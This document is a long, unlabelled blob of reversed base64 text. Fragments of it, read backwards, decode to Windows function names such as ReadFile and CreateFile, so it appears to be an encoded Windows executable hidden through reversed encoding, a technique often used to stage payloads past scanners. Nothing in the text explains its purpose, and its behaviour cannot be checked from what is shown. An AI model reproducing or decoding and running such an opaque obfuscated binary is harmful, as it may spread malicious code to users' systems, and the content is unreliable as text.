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QAE4AABQAAAEwAoDQADINABMguAEwAwCQADIKABMglAEwAICQADAHABMgXAEwAQBQAD4DABMAJAEwAKAQACQPABIg3AEgAODQACAMABIgrAEgAaCQAC4IABIAfAEgAsBQACYFABIgSAEgA+AQACgCABIgFAEgAKAQABIPABEg2AEQAGDQABgKABEAjAEQA4BQABQGABEgUAEQAEBQAFwOABUg+AEAAQDQAAgMABAguAEAAkCQAA4IABAgfAEAAsBQAAwFABAASAEAA4AQAAYCABAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEOSAEQA4AAAAAAAAAAAAEAAAAAAhDEABEgGAAAAAAAAAAAAA8P+AAQ4QBQAAgPAAAAAAAAAAAQAAgAAAAOAAEAAcDAAAAAAAAAAAAg/4CAQJ7IAAAAA////+DAAAAw///P0AAAAA8///7PAAAAAAA0vrCAAAAw///v/AAAAA8///DNAAAAA////+DAAAAAAA5rRAAAAA8///7PAAAAA////UDAAAAw///v/AAAAAAAQ8yHAAAAA////+DAAAAw///P1AAAAA8///7PAAAAAAA0q0AAAAAw///v/AAAAA8///DMAAAAA////+DAAAAAAAl6RAAAAA8///7PAAAAA////UDAAAAw///v/AAAAAAAQoCAAAdK/////+DAAAAw///P2AAAAA8///7PAAAAAAAkmmAAQaqw///v/AAAAA8///TNAAAAA////+DAAAAAAAhZ/AAAAA8///7PAAAAA////QDAAAAw///v/AA0lZBAAAAAAAAAAAAEmdAAAAAw///v/AAAAA8///jMAAAAA////+DAAAAAAAZ5VAAAAA8///7PAAAAA////UDAAAAw///v/AAAAAAAQS+OAAJ52////+DAAAAw///P2AAAAA8///7PAAAAAAAUkVCAQR63///v/AAAAA8///DNAAAAA////+DAAAAAAA94aAAAAA8///7PAAAAA////MDAAAAw///v/AAAAAAAQHaHAAAAA////+DAAAAw///P1AAAAA8///7PAAAAAAAUh6DAAAAw///v/AAAAA8///DNAAAAA////+DAAAAAAAFHvAAAAA8///7PAAAAA////UDAAAAw///v/AAAAAAAQuxEAAAAA////+DAAAAw///PzAAAAA8///7PAAAAAAAka+BAAAAw///v/AAAAA8///TNAAAAA////+DAAAAAAAdWCAAAAA8///7PAAAAA////MDAAAAw///v/AA0YOAAAAAw///v/AA0YCAAAAAw///v/AAAAA8///jNAAAAA////+DAQh9EAAAAA////+DAQhBEAAAAA////+DAAAAw///P1AAAAA